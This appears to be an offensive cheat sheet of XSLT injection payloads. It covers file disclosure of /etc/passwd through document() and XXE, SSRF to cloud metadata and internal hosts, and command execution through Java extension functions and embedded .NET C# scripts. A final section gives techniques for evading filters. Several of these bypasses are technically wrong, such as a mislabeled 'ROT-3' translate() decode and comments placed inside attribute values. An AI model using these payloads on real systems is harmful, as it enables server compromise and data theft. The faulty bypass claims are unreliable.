### üõ°Ô∏è XSLT Injection

**XSLT Injection** is a web vulnerability that occurs when user input is improperly handled in XSLT transformations, allowing attackers to execute arbitrary code, read files, or perform server-side request forgery. XSLT processors evaluate expressions and can access external resources, making this vulnerability particularly dangerous.

  * **Injection Point:** User-controlled input in XSLT stylesheets or transformation parameters
  * **Impact:** Remote code execution, file disclosure, SSRF attacks, system command execution
  * **Common Targets:** XML processing applications, document transformation systems, web services
  * **Root Cause:** Unsafe handling of user input in XSLT processing environments

-----

### üìù Basic XSLT Injection Payloads

Understanding fundamental XSLT injection techniques and their impact.

  * **System Information Disclosure**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <result>
                <version><xsl:value-of select="system-property('xsl:version')"/></version>
                <vendor><xsl:value-of select="system-property('xsl:vendor')"/></vendor>
                <vendor-url><xsl:value-of select="system-property('xsl:vendor-url')"/></vendor-url>
            </result>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** To gather information about the XSLT processor and environment. This helps identify the processor type (Xalan, Saxon, etc.) and version, which is crucial for crafting targeted exploits.
    **How it works:** The `system-property()` function is a standard XSLT function that returns information about the XSLT processor implementation. Different processors have different capabilities and security configurations, so knowing the processor helps determine what attack vectors are available.

  * **File Disclosure via document() Function**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <file-content>
                <xsl:copy-of select="document('file:///etc/passwd')"/>
            </file-content>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** To read local files from the server's filesystem. This can reveal sensitive information like passwords, configuration files, or application source code.
    **How it works:** The `document()` function in XSLT can load external documents. When combined with the `file://` protocol, it can access local files. The `xsl:copy-of` element copies the entire file content into the output, while `xsl:value-of` would only extract text content.

  * **Basic Command Execution (Java-based Processors)**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" 
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:java="http://xml.apache.org/xslt/java">
        
        <xsl:template match="/">
            <command-result>
                <xsl:value-of select="java:java.lang.Runtime.getRuntime().exec('whoami')"/>
            </command-result>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** To execute system commands on the server. This can lead to complete server compromise if the XSLT processor runs with sufficient privileges.
    **How it works:** This payload uses Java extension functions available in processors like Apache Xalan. The `java:` namespace prefix allows direct access to Java classes and methods. `Runtime.getRuntime().exec()` executes system commands, and the result is included in the transformation output.

-----

### üñºÔ∏è Advanced XSLT Injection Techniques

Sophisticated techniques for complex exploitation scenarios.

  * **XSLT with External Entity Expansion (XXE)**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <!DOCTYPE xsl:stylesheet [
        <!ENTITY xxe SYSTEM "file:///etc/passwd">
    ]>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <stolen-data>&xxe;</stolen-data>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** To combine XSLT injection with XXE for file disclosure. This approach can bypass some XSLT-specific security controls by leveraging XML parsing vulnerabilities.
    **How it works:** The external entity `&xxe;` is defined in the DOCTYPE declaration and references a local file. When the XML parser processes the stylesheet, it resolves the entity before XSLT transformation begins. The entity content is then included in the output during XSLT processing.

  * **SSRF via XSLT document() Function**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <internal-response>
                <xsl:copy-of select="document('http://169.254.169.254/latest/meta-data/')"/>
                <xsl:copy-of select="document('http://localhost:8080/admin/')"/>
                <xsl:copy-of select="document('http://192.168.1.1/')"/>
            </internal-response>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** To perform SSRF attacks and access internal services. This can reveal cloud metadata, internal application data, or network information.
    **How it works:** The `document()` function can make HTTP requests to any URL. When the XSLT processor resolves these function calls, it acts as a server-side HTTP client. This allows attackers to probe internal networks, access cloud metadata endpoints, or interact with internal services that shouldn't be exposed.

  * **Parameter Injection Attacks**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:param name="userParam"/>
        <xsl:template match="/">
            <injected>
                <xsl:value-of select="$userParam"/>
                <xsl:copy-of select="document($userParam)"/>
            </injected>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** When XSLT parameters are user-controlled and improperly handled. This is common in applications that allow dynamic XSLT transformations with user-supplied parameters.
    **How it works:** The `xsl:param` element defines a parameter that can be set externally. If the application allows users to control parameter values without validation, attackers can inject XPath expressions. The `$userParam` variable is directly evaluated in XPath contexts, allowing injection of dangerous functions like `document()` or system commands.

-----

### üîÑ Extension Functions Exploitation

Leveraging processor-specific extension functions for advanced attacks.

  * **Java Runtime Execution**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" 
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:runtime="http://xml.apache.org/xalan/java/java.lang.Runtime"
        xmlns:process="http://xml.apache.org/xalan/java/java.lang.Process">
        
        <xsl:template match="/">
            <execution-result>
                <xsl:variable name="runtime" select="runtime:getRuntime()"/>
                <xsl:variable name="process" select="runtime:exec($runtime, 'ls -la /')"/>
                <xsl:variable name="inputStream" select="process:getInputStream($process)"/>
                <xsl:value-of select="java:java.util.Scanner(java:java.io.InputStreamReader($inputStream))"/>
            </execution-result>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** For complex command execution with output capture. This approach allows attackers to not only execute commands but also retrieve and display their output.
    
    **How it works:** This payload uses multiple Java classes through extension functions:
    * `runtime:getRuntime()` gets the Java Runtime instance
    * `runtime:exec()` executes the system command
    * `process:getInputStream()` captures the command output
    * `java.util.Scanner` and `InputStreamReader` read the output stream
    
    The result is that command output is included in the transformed XML output.

  * **.NET Extension Functions**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" 
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:msxsl="urn:schemas-microsoft-com:xslt"
        xmlns:app="http://my.app">
        
        <msxsl:script language="C#" implements-prefix="app">
            <![CDATA[
            public string ExecuteCommand(string cmd) {
                System.Diagnostics.Process process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + cmd;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.RedirectStandardOutput = true;
                process.Start();
                return process.StandardOutput.ReadToEnd();
            }
            ]]>
        </msxsl:script>
        
        <xsl:template match="/">
            <result>
                <xsl:value-of select="app:ExecuteCommand('whoami')"/>
            </result>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** For command execution in .NET environments. This targets Microsoft's XSLT processors used in ASP.NET applications.
    **How it works:** The `msxsl:script` element allows embedding C# code directly in XSLT stylesheets. The code defines a custom function `ExecuteCommand` that uses the `System.Diagnostics.Process` class to run system commands. The function is then called using the `app:` namespace prefix, and the command output is included in the transformation result.

-----

### üåÄ XSLT Injection in Different Contexts

Exploiting XSLT injection across various application scenarios.

  * **XML Processing Pipeline Injection**

    ```xml
    <?xml version="1.0"?>
    <?xml-stylesheet type="text/xsl" href="user-controlled.xsl"?>
    <data>
        <user>test</user>
        <content>malicious content</content>
    </data>
    ```

    **Why it's used:** When the application allows user-controlled XSLT references. This is common in applications that let users customize XML presentation.
    **How it works:** The `<?xml-stylesheet?>` processing instruction tells the XML processor to apply an XSLT transformation. If attackers can control the `href` attribute (through file upload, URL parameters, or user input), they can reference a malicious XSLT stylesheet that gets processed by the server.

  * **Inline XSLT in XML Data**

    ```xml
    <?xml version="1.0"?>
    <data>
        <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
            <xsl:template match="/">
                <xsl:value-of select="document('file:///etc/passwd')"/>
            </xsl:template>
        </xsl:stylesheet>
        <normal-content>legitimate data</normal-content>
    </data>
    ```

    **Why it's used:** When XML data containing XSLT is processed without sanitization. This can occur in content management systems or data processing pipelines.
    **How it works:** Some XML processors will recognize and execute XSLT elements embedded within regular XML data. If the application processes such XML without stripping XSLT elements, the embedded stylesheet gets executed, allowing attackers to inject malicious transformation logic directly in the data payload.

  * **Dynamic XSLT Generation**

    ```xml
    <?xml version="1.0"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document(concat('file:///', /user/input))"/>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** When user input dynamically constructs XSLT expressions. This happens in applications that build XSLT templates based on user data.
    **How it works:** The XPath expression `/user/input` extracts data from the source XML document. If this data is user-controlled and used in dangerous functions like `document()`, attackers can manipulate the XML input to control file paths or URLs accessed during transformation. The `concat()` function builds the final path dynamically.

-----

### ü§´ Obfuscation and Bypass Techniques

Advanced techniques to evade XSLT injection detection.

  * **Encoding and String Concatenation**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:variable name="proto" select="'file'"/>
            <xsl:variable name="separator" select="'://'"/>
            <xsl:variable name="path" select="'/etc/passwd'"/>
            <xsl:value-of select="document(concat($proto, $separator, $path))"/>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** To bypass string-based detection of dangerous patterns. Security filters often look for complete strings like "file:///etc/passwd".
    **How it works:** This technique splits the dangerous string into multiple variables and reconstructs it using the `concat()` function. Since each variable contains harmless substrings, they may bypass static analysis. During execution, the concatenation recreates the full dangerous string that the XSLT processor evaluates.

  * **Comment Obfuscation**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document(<!-- bypass -->'file:///etc/passwd')"/>
            <xsl:value-of select="docu<!-- comment -->ment('http://internal/')"/>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** When comments can break pattern matching in security filters. Some filters use simple string matching that can be confused by comments.
    **How it works:** XML comments `<!-- comment -->` are ignored by XML parsers but may break naive security filters. When the XSLT processor evaluates the expression, it ignores the comments and processes the complete function call. This can bypass filters that look for specific function names or patterns.

  * **Multiple Encoding Layers**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
        <xsl:template match="/">
            <xsl:value-of select="document('file:///%2F%65%74%63%2F%70%61%73%73%77%64')"/>
            <xsl:value-of select="document(translate('gjmf:///fdu/qbttxe','abcdefghijklmnopqrstuvwxyz','xyzabcdefghijklmnopqrstuvw'))"/>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** To evade encoding-aware security controls. Some security systems decode input once but may not handle multiple encoding layers.
    **How it works:** The first payload uses URL encoding (`%2F` = `/`, `%65` = `e`, etc.). The second payload uses a simple substitution cipher (ROT-3) where 'file' becomes 'gjmf' and 'etc/passwd' becomes 'fdu/qbttxe'. The `translate()` function decodes it at runtime. The XSLT processor evaluates the decoded values, while security filters might only see the encoded versions.

  * **Namespace Manipulation**

    ```xml
    <?xml version="1.0" encoding="UTF-8"?>
    <xsl:stylesheet version="1.0" 
        xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
        xmlns:xj="http://xml.apache.org/xslt/java"
        xmlns:exec="xj:java.lang.Runtime">
        
        <xsl:template match="/">
            <xsl:value-of select="exec:getRuntime().exec('id')"/>
        </xsl:template>
    </xsl:stylesheet>
    ```

    **Why it's used:** To bypass namespace-based restrictions. Some security configurations might only block specific namespace prefixes.  
    **How it works:** This technique uses custom namespace prefixes and combinations. The `xj:` namespace is mapped to the Java extension URI, and then `exec:` is defined as an extension of that. This creates an indirect reference to Java methods that might bypass filters looking for direct `java:` namespace usage.

-----

**Made with love by VIsh0k**